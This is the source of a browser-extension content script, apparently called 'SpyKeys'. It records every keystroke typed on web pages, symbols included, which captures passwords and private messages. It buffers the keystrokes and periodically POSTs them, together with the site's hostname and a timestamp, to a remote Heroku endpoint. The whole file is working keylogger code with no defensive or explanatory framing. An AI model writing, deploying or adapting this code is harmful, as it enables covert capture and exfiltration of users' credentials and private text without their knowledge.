let apiKey;

let buffer = [];
let timer = new Timer(resetBuffer, 3750);
let msg = '';

document.addEventListener('keyup', () => {
  timer.reset()
})

document.addEventListener('keydown', event => {
  timer.stop();
  const charList = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 `~!@#$%^&*()-_=+[]{};:?.>,<|\'\"';
  try {
    const key = event.key;

    // alphanumeric keys only
    if (charList.indexOf(key) === -1) return;

    msg = msg.concat(key);

  } catch (e) {
    console.log(e)
  }
});


// sleep time expects milliseconds
const timeout = function sleep(time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

function resetBuffer() {
  let temp = msg;
  if (chrome.runtime?.id) {
    chrome.storage.sync.get(["SPYKEYS_SUBSCRIBED_CLICKED"], function (items) {
      if (items["SPYKEYS_SUBSCRIBED_CLICKED"]) {
        chrome.storage.sync.get(["SPYKEYS_SUBSCRIBED_X-API-KEY"], function (items) {
          apiKey = items['SPYKEYS_SUBSCRIBED_X-API-KEY'];
          if (apiKey) {
            if (!(temp.length === 0)) {
              postData(temp)
                .then(response => {
                  return
                });

            }
          }
        })
      }
    })
  }
  buffer = [];
  msg = '';
}

function Timer(fn, t) {
  var timerObj = setInterval(fn, t);

  this.stop = function () {
    if (timerObj) {
      clearInterval(timerObj);
      timerObj = null;
    }
    return this;
  }

  // start timer using current settings (if it's not already running)
  this.start = function () {
    if (!timerObj) {
      this.stop();
      timerObj = setInterval(fn, t);
    }
    return this;
  }

  // start with new or original interval, stop current interval
  this.reset = function (newT = t) {
    t = newT;
    return this.stop().start();
  }
}

// POST method implementation:
async function postData(text = 'NULL') {

  let timestamp = Math.round(new Date().getTime()).toString().substring(0, 10);
  let domain = window.location.hostname;

  const response = await fetch('https://api-spykeys.herokuapp.com/submit', {
    method: 'POST',
    mode: 'cors',
    cache: 'no-cache',
    headers: {
      'x-api-key': `${apiKey}`,
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    referrerPolicy: 'no-referrer',
    body: JSON.stringify({
      "text": `${text}`,
      "domain": `${domain}`,
      "timestamp": `${timestamp}`
    })
  });

  return response.text();

}